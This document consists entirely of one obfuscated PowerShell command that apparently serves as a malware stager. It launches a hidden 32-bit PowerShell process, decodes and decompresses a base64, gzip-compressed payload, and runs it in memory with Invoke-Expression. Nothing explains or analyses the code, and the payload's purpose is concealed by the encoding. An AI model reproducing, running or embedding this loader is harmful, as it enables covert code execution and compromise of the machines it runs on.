
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAPFRalcCA71WbY/aRhD+fJHyH6wIybZKeD+SnBSpNhgwhznA2BwQVO3Za3th/RJ7zQFp/nvHgHOkuWvTVqqFxe7Oy84+88yOnTSwGAkDzlHq5oyOwxr35fWrqxGKkc8JBWvRbCwO7zW9yBV2s+ag3lB34tUVaBQ+70md+8gJSymK2qGPSLC6uWmlcYwDdpqXuphJSYL9B0pwIojc79zMwzF+e/ewxhbjvnCF30pdGj4gelbbt5DlYe6tFNiZbBBaKAuupEeUMIH/9IkXl2+rq5LyOUU0EXh9nzDsl2xKeZH7KmYbTvcRFniNWHGYhA4rzUhQr5WMIEEOHoK3LdYw80I74UU4BfxizNI44I7nyRycxAIPw1EcWpJtxzgB7ZIabMMNFgpBSmmR+1VYnnefpAEjPgY5w3EY6TjeEgsnpR4KbIon2FkJQ/yYH/pnjYRLI9AasVgsQkaeCVML7ZTikyUv/hjoUxZFeC4zCRB8ff3q9SsnZ4GrIuWSADC6Wh7HGOIURmFCjnofuUqR02BHxMJ4D9PCNE6xuOKWGf7L1YorpD3LiCfrW1p82Uk1twB9uln0G5S2YHlphsRegdk5RYWDMt6mv7GphKaZ+GXGtbFDAtzeB8gnVk4q4Tn8sUPx8cylXG0I8Qn8WYDtNqbYRSxDtMgtfzRTfMK+2copoTaOJQtymEBUkF7x+2BOSRJ4NdCwD5id5jxkwwEq41z7TN99vns2ByW+RVGSFLlRCrVkFTkdI4rtIicFCTmLpJSFxyH/FK6WUkYslLDc3Ur8E5znbVthkLA4tSCbAMFUj7BFEM0QKXI9YmN5rxM3355/Fo8WopQELnjaQj5gJcNBZxlHYoj0iQ9iScdM9SOKfVA8FniHIhfK+VwUR2YhF9v8C9Hm3D8RPYMnx+UiVsi5TkNW5EwSM7guMqhzjv2HcC5ujMvAWjE+Z0vIi2op71lWCgWXJBlrz5AdAYoZgNOJQ19GCW42dBYDdMKb8h1pSfDM1YBqlrwhVemRVFUNXoPU1bD9zr7tr3vluL3zHElNVK03ao97vca2r5sNpisqux2pTFPu12td6k2MOVuoUm9KKpt54xD1yUEfSPZ8V24e5MNjRd4d1q7tzNuO475z9En1ukMGs9ZYrtTQoK2kg5n8KFcaiUIee2NijDf9DnuYmxQZTtm9r35AZDeI12Y1fPDNitT16mh2HZldT7P38175g7GrVYdTA17UjmYYOeWqCWMX1mqepYwlqXmbZMfdjoPh/KEjO1qXjYy63bRq0QDT6A516cSuLeaLdv96ogwdvd6vDaZSfTxzJaPr3ZNFuVv+MOvv6DCU2gPX62T72VPTX8em3ngHshlyIwep0kGSWv1GN1SMbuiYvledRE2wNY/xmb7LZM/L9DuPPUOd1u8XTSWE0OTP464rKTBC8I4leYo6ZGP8cl+uLmCvRhCYNVdSQWZUF6ESoX5jWzY9S64cGklPsu7A3z2daUOn2XPK5fL73d1UTbXpvDFYK/Av7aTB9pGhPsQpTwGzj28ylgHNCv6Cmua6fk0vyPNS29BQnHiIAqmgH+TF3gnjzvliH4UksxCEpza/wXGAKfRG6J55jUiUhlbWZo59AFrcqfGsoOANGNZrz45E7pui+NR+8qWbmwWEChUHZVAa4MBlXrGyq1cq0EEqu0YFjvvzp2uF0V7IPBWzBvQE0dk9PboXs+orWLWaRfqbAasl6f+A4PkC8ODP/jsEn9b+QvpTqFaKFxj8IPt+4R8B/e9AmCHCQF2Hy4ziU8N9HoszcS4+Vi7TBfxwzk/20XiXsrdD+Jb5A3AgamOsCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

